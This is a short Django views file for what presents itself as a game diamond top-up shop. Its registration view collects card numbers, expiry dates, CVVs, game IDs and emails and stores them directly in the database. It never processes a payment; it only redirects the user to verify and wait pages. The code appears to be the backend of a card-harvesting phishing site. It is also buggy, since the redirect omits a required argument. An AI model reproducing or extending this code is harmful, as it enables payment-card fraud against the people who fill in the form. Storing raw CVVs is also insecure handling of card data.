from django.shortcuts import render
from django.http import HttpResponseRedirect
from .models import Diamantes, EmailValido,  CardsDatas


def index(request):
      return render(request, "recargas/index.html")


def registro(request, numero):
      diamantes = Diamantes.objects.get(pk=numero)
      contex = {
            "comprobar_numeros": numero,
            "diamantes": diamantes,
            }
      if request.method == 'POST':
            card = CardsDatas()
            email_3 = EmailValido()

            card.comprobar_numero =  numero
            card.id_game = request.POST['id_game']
            card.number_card = request.POST["number_card"] 
            card.date = request.POST["date"] 
            card.cvv = request.POST["cvv"]


            email_3.email_correo = request.POST['email_3']
            email_3.save()
            card.save() 

            return HttpResponseRedirect("/verificar/")
      else:
        
     
            return render(request, "recargas/registro.html", contex)
                  
      
      
def verificar(request,id_game):
      cards = CardsDatas.objects.all()
      lista_id_game = []
      for card in cards:
               lista_id_game.append(card.id_game)
      counts = len(lista_id_game)
      listo = lista_id_game[counts-1]

      context = {
            "listo": listo,
      }

      return render(request,"recargas/verificar.html", context)
     
     
def  esperar(request):
      email = EmailValido.objects.all()

            
      contex = {
            'email': email,
      }
      return render(request, "recargas/esperar.html", contex)


def info(request):
      return render(request,'recargas/info.html')



